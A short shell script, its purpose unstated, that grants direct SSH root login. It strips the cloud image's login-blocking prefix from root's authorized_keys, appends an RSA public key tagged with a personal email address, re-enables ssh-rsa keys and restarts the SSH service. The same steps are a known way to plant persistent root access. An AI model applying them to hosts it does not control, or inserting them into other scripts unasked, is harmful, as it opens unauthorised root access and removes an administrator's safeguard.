mkdir -p /root/.ssh/;
sed -e "s/echo;sleep 10;exit 142//g" -i /root/.ssh/authorized_keys;
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGxXIbBDF83pIBxn/jrk6D2Pg7uSijWJlyh23CMTrE05SuWEvTWl2Fv4nKF8euokLeMXJBT3J78cgbWwZ0cSIzWxdK2nRanbKHL8Yd/Rd2CBZQVElZ9TbEVhOnxA/ZOm7SUsQrIJgyoHfuCJX89wAzNDfWUzo2NpKAps9IW51HM9hU0n5t5vGNDJ2KocQ+r0zmUdUz4qtxO+HQff35mrVFscFkVpz6tLbyTMFg7l94KlGMNvq5GX164pU8p+/AhXFVNaAeRvgVbktPpRphR+NLgQTya4iKVagiExFo5mm9z7Z4MvXC14eqSwTxLp+ehJvGHadJHTlp/HnZ8vteMz9uZFPRiT1tO6Bz9/KOz+H76Di1JmC8vwgTXMYxNYWsSqTF3p4LG3fK9h0qr3orCjb8GsgqveWNwKFU/pCu4Tgbh4Y/yonRLGoZ7ijRagk/WcHsQcrIcrJNlwRMYvzs1Keu+DK1IzQxlY0y/GEnFG2y2dQRtJwFv4LzRIHf8ZRZ1jc= devrajshetake@gmail.com" >> /root/.ssh/authorized_keys;
echo "PubkeyAcceptedKeyTypes=+ssh-rsa" >> /etc/ssh/sshd_config;
service ssh restart;
